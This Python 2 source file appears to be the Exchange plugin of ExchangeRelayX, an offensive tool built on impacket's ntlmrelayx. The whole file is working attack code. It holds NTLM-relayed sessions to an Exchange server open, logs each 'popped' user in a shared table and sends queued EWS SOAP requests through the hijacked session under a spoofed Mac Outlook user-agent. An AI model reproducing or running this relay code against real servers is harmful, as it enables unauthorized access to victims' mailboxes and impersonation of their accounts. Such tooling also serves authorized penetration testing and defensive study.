#!/usr/bin/python
from impacket.examples.ntlmrelayx.attacks.httpattack import HTTPAttack
from threading import Thread
import logging
import time
import base64

# The HTTPS plugin used in a relayed connection 
class ExchangePlugin(HTTPAttack):
	def __init__(self, config, client, username):
		self.config = config
		self.client = client
		self.username = username.encode("utf-8")
		self.user_agent = "MacOutlook/14.7.1.161129 (Intel Mac OS X 10.9.6)" 	# Mac Outlook user-agent, because Outlook for Mac uses EWS
		Thread.__init__(self)

	def run(self):
		if(self.username not in self.config.PoppedDB.keys()):
			self.config.PoppedDB_Lock.acquire()
			self.config.PoppedDB[str(self.username)] = {"b64_request" : "", "b64_response" : "", "thread_id" : ""}
			self.config.PoppedDB_Lock.release()
			logging.info("Added " + self.username + " to connection manager")
		else:
			logging.info("Ignoring " + self.username + " - we already have their relay")
			exit()

		# Check if there are any new requests in the queue to make for this user
		try:
			while True:
				# Chill for a sec
				time.sleep(.25)
				# If another thread (ie the UI) gave us a request, pass it on
				self.config.PoppedDB_Lock.acquire()
				if(self.config.PoppedDB[self.username]['b64_request'] != ""):
					self.client.request("POST", "/EWS/Exchange.asmx", base64.b64decode(self.config.PoppedDB[self.username]['b64_request']), headers = {"Content-Type":"text/xml", "Connection":" keep-alive", "User-Agent" : self.user_agent })
					data = self.client.getresponse()
					# logging.info("Got response at the basic level! " + str(data.__dict__))
					doc = data.read()
					if(doc == ''):
						doc = "<ExchangeRelayX - No data returned from EWS Server. EWS returned status code: " + str(data.status) + ">"
					self.config.PoppedDB[self.username]= {'b64_request' : '', 'b64_response' : base64.b64encode(doc), "thread_id" :  self.config.PoppedDB[self.username]['thread_id']}
				else:
					# Keep the connection alive
					self.client.request("GET", "/EWS/Exchange.asmx", headers = {"Connection":" keep-alive", "User-Agent" : self.user_agent})
					reading = self.client.getresponse()
					reading.read()
				self.config.PoppedDB_Lock.release()
		except Exception, e:
			try:
				self.config.PoppedDB_Lock.release()
			except:
				pass
			logging.info("Lost relay for " + self.username + " :( - " + str(e))
			try:
				if(self.username in self.config.PoppedDB.keys()):
					self.config.PoppedDB_Lock.acquire()
					try:
						if(self.username in self.config.PoppedDB.keys()):
							del(self.config.PoppedDB[self.username])
						self.config.PoppedDB_Lock.release()
					except:
						try:
							self.config.PoppedDB_Lock.release()
						except:
							pass
				if(self.config.PoppedDB_Lock.locked()):
					self.config.PoppedDB_Lock.release()
			except Exception, e:
				exit(0)
			# This exits the 'run' function, killing the thread
